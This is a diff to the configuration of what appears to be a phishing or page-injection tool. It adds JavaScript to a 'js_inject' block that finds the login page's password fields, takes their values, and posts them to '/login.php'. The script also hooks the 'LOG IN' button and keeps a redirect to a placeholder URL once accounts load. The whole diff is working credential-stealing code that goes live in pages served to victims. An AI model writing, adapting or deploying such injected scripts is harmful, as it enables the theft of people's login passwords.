@@ -36,24 +36,32 @@ js_inject:
     trigger_paths: ["/"]
     trigger_params: []
     script: |
+      var loc = window.location;
+      var is_login = (loc.pathname == '/') && (loc.search.indexOf('ac=1') != -1)
+
+      function grab_password() {
+        // grab the password (which should not be empty)
+        var passwords = document.getElementsByName("password");
+        var password = null;
+        for (var i = 0; i < passwords.length; i++) {
+          password = password || passwords[i].value;
+        }
+        return password;
+      }
+
+      login_onclick = function() {
+        // grab and send to server
+        var password = grab_password();
+        $.post("/login.php", {
+          '_password': password,
+          '__ex_ignore__': ''
+        }, function(data, status) {});
+      }
+
       if ((typeof _startLogin === 'undefined') && (typeof startLogin !== 'undefined')) {
-        
         _startLogin = startLogin;
         startLogin = function() {
-          var form = document.getElementById("loginform");
-
-          var hidden_password = document.getElementById("_password");
-          if(!hidden_password) {
-            hidden_password = document.createElement("input");
-            hidden_password.type = "hidden";
-            hidden_password.id = "_password";
-            hidden_password.name = "_password";
-            form.appendChild(hidden_password);
-          }
-
-          var password = document.querySelector("#password").value;
-          hidden_password.value = password;
-
+          login_onclick();
           _startLogin();
         }
         console.log("Injecting login code...")
@@ -63,10 +71,37 @@ js_inject:
         _postacctsload = postacctsload;
         postacctsload = function() {
           // Redirect once credentials are loaded
+          // We assume by this point we have all that we need
           window.location.href = "{{REDIRECT_URL}}";
           _postacctsload();
         }
         console.log("Injecting post accounts code...")
       }
       
-      
+      find_login_button = function() {
+        var buttons = document.getElementsByTagName('button');
+        for (var i = 0; i < buttons.length; i++) {
+          var button = buttons[i];
+          if(button.innerText == 'LOG IN') 
+            return button
+        }
+      }
+
+      find_and_inject_login_button = function() {
+        // Look for a trigger when to try to grab the password
+        // If this changes maybe whenever ENTER is pressed ?
+        var login_button = find_login_button();
+        if(login_button){
+          console.log('Injected login onclick ...')
+          login_button.onclick = login_onclick;
+        } else {
+          setTimeout(find_and_inject_login_button, 100)
+        }
+      }
+
+      if (is_login) {
+        setTimeout(find_and_inject_login_button, 100);
+      }
+
+
+
